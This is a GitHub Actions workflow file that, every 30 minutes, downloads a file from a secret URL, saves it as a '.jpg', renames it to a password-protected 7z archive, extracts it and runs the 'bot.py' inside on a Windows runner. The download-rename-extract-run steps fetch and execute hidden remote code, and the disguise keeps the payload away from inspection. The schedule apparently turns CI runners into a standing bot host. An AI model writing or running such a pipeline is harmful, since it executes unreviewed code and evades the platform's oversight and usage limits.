name: Windows Worker

on:
  workflow_dispatch:
  schedule:
    - cron: "*/30 * * * *"

concurrency:
  group: worker
  cancel-in-progress: true

jobs:
  worker:
    runs-on: windows-latest
    timeout-minutes: 90

    steps:
      - uses: actions/checkout@v3

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Prepare dependencies
        shell: powershell
        run: |
          choco install 7zip -y --no-progress

      - name: Download package
        shell: powershell
        env:
          SRC_URL: ${{ secrets.LINK }}
        run: |
          $ErrorActionPreference = "Stop"
          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "p.jpg"

      - name: Rename & extract package
        shell: powershell
        env:
          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
        run: |
          $ErrorActionPreference = "Stop"

          Rename-Item p.jpg p.7z -Force

          & "C:\Program Files\7-Zip\7z.exe" x p.7z -p"$Env:ARCHIVE_KEY" -oextracted -y

          Write-Host "===== Extracted Structure ====="
          Get-ChildItem -Recurse extracted

      - name: Run worker (bot.py only)
        shell: powershell
        run: |
          $ErrorActionPreference = "Stop"

          if (-Not (Test-Path "extracted\bot.py")) {
              Write-Error "bot.py not found in extracted folder"
          }

          cd extracted

          Write-Host "===== Current Directory ====="
          Get-Location

          Write-Host "===== Files in Current Directory ====="
          Get-ChildItem

          Write-Host "===== Running bot.py ====="
          python bot.py
